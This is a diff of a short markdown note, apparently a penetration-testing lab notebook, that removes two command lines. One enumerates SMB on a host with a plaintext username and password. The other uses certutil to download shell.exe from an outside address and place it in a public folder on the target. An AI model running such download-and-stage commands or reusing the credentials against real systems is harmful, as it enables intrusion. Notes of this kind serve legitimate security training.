@@ -1,11 +1,12 @@
 [[Editing Copy Page]]
 
 ```
-enum4linux-ng 192.168.196.122 -u "fmcsorley" -p "CrabSharkJellyfish192"
+
 ```
 
 ```
-certutil -urlcache -split -f http://192.168.45.161:80/shell.exe /Users/Public/shell.exe
+
+```
 
 ```
 
